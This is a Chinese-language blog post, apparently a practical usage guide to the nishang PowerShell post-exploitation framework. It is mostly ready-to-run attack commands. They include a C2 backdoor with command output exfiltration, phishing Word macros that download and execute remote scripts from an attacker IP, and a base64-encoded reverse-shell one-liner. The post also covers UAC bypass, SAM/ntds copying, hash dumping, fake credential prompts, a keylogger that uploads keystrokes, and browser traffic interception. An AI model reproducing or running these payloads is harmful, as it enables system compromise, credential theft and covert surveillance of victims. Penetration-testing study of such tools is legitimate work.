---
title: "后渗透框架 nishang"
date: 2019-07-26T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['powershell']
categories: ['内网渗透']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


nishang 是基于 PowerShell 的攻击框架, 面向红队和渗透测试人员, 该框架提供了许多有用的脚本和 Payload, 适用于渗透测试的各个阶段.

限于篇幅, 仅对常用脚本进行说明.

<!--more-->

## HTTP-Backdoor

将 WebServer, Gmail, Pastebin 或 DNS 作为 C2 服务器执行命令和传输回显.

```
 HTTP-Backdoor -CheckURL https://192.168.1.1/ctrl.php -MagicString start -StopString stop -PayloadURL https://192.168.1.1/cmd.php -Exfil -ExfilOption webserver -URL https://192.168.1.1/out.php
```

运行之后脚本会每隔一段时间访问 CheckURL, 然后查找有没有我们指定的 MagicString 和 StopString 关键字, 如果后者存在,则脚本停止运行, 前者则从 PayloadURL 里下载命令并执行, 默认在当前窗口回显结果. 

在添加了 Exfil 和 ExfilOption参数指定 C2 类型之后, 脚本会将命令执行后的回显进行编码和压缩, 然后向 URL 发送 Post Raw Data. PHP 可以使用 `php://input` 接受数据.

通过 Utility 中的 `Invoke-Decode.ps1` 脚本进行解码.

```
Invoke-Decode -EncodedData .\out.txt
```

## Out-Word

生成钓鱼 Word 文档, 通过宏执行命令.

另有 `Out-Excel`, `Out-CHM` 等, 在此不再赘述.

生成方式.

```
Out-Word -PayloadURL http://192.168.1.1/evil.ps1 -Arguments "Invoke-Shellcode -Shellcode $buf"
```

`evil.ps1` 脚本内容. 

```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.1/payload.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.1/Invoke-Shellcode.ps1')
```

其它方式.

```
Out-Word -Payload "powershell.exe -ep bypass -w hidden -noprofile -enc JABzAG0APQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADEALgAxACcALAA0ADQANAA0ACkAKQAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAdAA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwBtAC4AUgBlAGEAZAAoACQAYgB0ACwAMAAsACQAYgB0AC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZAA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB0ACwAMAAsACQAaQApADsAJABzAHQAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACgAaQBlAHgAIAAkAGQAIAAyAD4AJgAxACkAKQA7ACQAcwBtAC4AVwByAGkAdABlACgAJABzAHQALAAwACwAJABzAHQALgBMAGUAbgBnAHQAaAApAH0A"
```

使用的是 Shells 里的 `Invoke-PowerShellTcpOneLine`, 不过只能弹纯 shell 或者半个 meterpreter.

当然你也可以先禁用宏再打开, 然后自己编辑一点内容以达到钓鱼的效果.

实际测试中在 Office 2016 的环境下生成失败, 在虚拟机内的 Office 2010 中生成成功.

## Invoke-PsUACme

集成 7 种 BypassUAC 方式的 PowerShell 脚本. 默认弹窗, 不过实战中肯定是不可能弹窗的.

```
Invoke-PsUACme -Payload "echo test > C:\test.txt"
```

另可指定 `-Method` 为 sysprep, oobe, actionqueue, migwiz, cliconfig, winsat, mmc 其中之一.

也能指定 BypassUAC 后要执行的脚本和 DLL 文件.

## Execute-Command-MSSQL

使用 PowerShell 在指定 MSSQL 服务器上执行命令.

```
Execute-Command-MSSQL -ComputerName DC -UserName sa -Password 1234 -Payload IEX "(New-Object Net.WebClient).DownloadString('http://192.168.1.1/evil.ps1')"
```

默认执行命令的方式是 `xp_cmdshell`, 自己也可以更改为其它方式.

## Check-VM

检测是否为 Hyper-V, VMware, Virtual PC, Virtual Box, Xen 或 QEMU 的虚拟机.

```
Check-VM
```

可能会有误报, Windows 10 物理机显示为 Hyper-V 主机.

## Copy-VSS

同 PowerSploit 中的卷影复制, 不过这个倒是一键化了, 默认复制 SAM, SYSTEM, ntds 三个文件并保存至当前目录, 根据需要自行修改要复制的文件.

```
Copy-VSS
```

## Invoke-CredentialsPhish

凭据钓鱼, 弹出登陆框诱使受害者输入账号密码, 密码错误的话会继续弹出登录框.

```
Invoke-CredentialsPhish
```

其实挺鸡肋的, 在 meterpreter 中执行根本不会弹框, 目前只能手动改改添加发送代码, 弄到钓鱼文件里执行.

## FireBuster FireListener

这是一套用于出口测试的脚本, 说白了就是检测防火墙会允许哪些端口通信. 你用它扫端口也可以, 不过只能指定端口范围而非单个单个的端口, 还不如使用比它做的更好的脚本, 例如 `Invoke-PortScan`.

在本机上执行.

```
FireListener 1000-1010
```

在目标主机上执行.

```
FireBuster 192.168.1.1 1000-1010
```

如果从 1000-1010 都能连通, 就说明防火墙对这 10 个端口是不拦截的, 如果有连接失败的, 那就是被防火墙拦截了.

## Get-Information

用于快速信息收集的 PowerShell 脚本. 功能就是把平常在做信息收集的时候使用的脚本集合到一起. 包括用户信息, WIFI 信息, 已安装的软件等.

```
Get-Information
```

输出很长 :)

## Get-PassHashes

无需 SYSTEM 权限导出用户 Hash.

```
Get-PassHashes
```

## Keylogger

键盘记录脚本. 这个模块是直接执行的, 无须导入. 和 `HTTP-BackDoor` 一样检查 `MagicString` 等, 就不再详细说明了.

第一种执行方式.

```
.\Keylogger.ps1 -CheckURL https://192.168.1.1/ctrl.php -MagicString stop
```

记录会保存在 `C:\Windows\Temp\key.log` 中. 其本质为启动了一个 PowerShell 线程.

第二种执行方式.

```
.\Keylogger.ps1 -CheckURL http://192.168.1.1/ctrl.php -MagicString stop -Exfil -ExfilOption webserver -URL http://192.168.1.1/out.php  
```

运行之后会创建两个任务, 第一个为键盘记录, 第二个则每隔一段时间将保存的记录上传至指定的 C2 服务器中.

存储在本地的记录需要通过 Utility 下的 `Parse_Keys.ps1` 进行解析 , 如果是上传至 C2 服务器的记录, 则还会进行一次编码, 要用 `Invoke-Decode.ps1` 先解码一次再使用 `Parse_Keys.ps1` 解析内容.

```
Parse_keys key.log out.txt
```

## Get-PassHints

获取用户的密码提示.

```
Get-PassHints
```

## Get-WebCredentials

从 Windows 凭据管理器中导出已保存的凭据. 在 PowerSploit 中也有类似的版本, 不过这个需要 PowerShell v3 及以上版本.

```
Get-WebCredentials
```

## Invoke-Interceptor

浏览器嗅探.

```
Invoke-Interceptor -AutoProxyConfig
```

`-AutoProxyConfig` 会让浏览器启用自动代理, 然后所有浏览数据都会经过这个脚本并被输出, 记录被保存在 `C:\windows\Temp\interceptor.log` 中.

另可手动指定 `ListenPort` 监听特定端口用于特殊情况.

## Invoke-PortScan

端口扫描.

```
Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.100 -ResolveHost -ScanPort -Port 80,8080,445,3389
```

其中仅能通过逗号分隔指定端口, 使用 `-ResolveHost` 可在扫描前将 IP 地址解析为主机名.

如果不指定 `-Port` 将会扫描常用的 30 多个端口.

## Powerpreter

算是 nishang 的单文件版本, 但只集成了大部分功能, 个人建议还是手动导入需要的脚本.

```
Import-Module .\Powerpreter.psm1
```

导入后会发现大部分的脚本如 `Invoke-PortScan`, `Get-PassHashes` 都能够使用了, 不过像比如 `Invoke-Mimikatz`, `Invoke-Interceptor` 这些就没有被包含进去.

## Invoke-PowerShellTcp (OneLine)

反弹 shell 或者半个 meterpreter 的脚本, 有 Bind 和 Reverse 两种方式.

```
Invoke-PowerShellTcp -IPAddress 192.168.1.1 -Port 4444 -Reverse
```

OneLine 的版本只需要打开文件然后复制命令, 改一下 IP 和端口就行了.

## 总结

写了一些比较常用和容易上手的 nishang 脚本. 比起 PowerSploit, nishang 的脚本功能更多, 也更全面, 基本上能够胜任渗透测试各个阶段的工作. 至于其它的一些脚本, 需要大家在实战中慢慢的去学习和利用 :)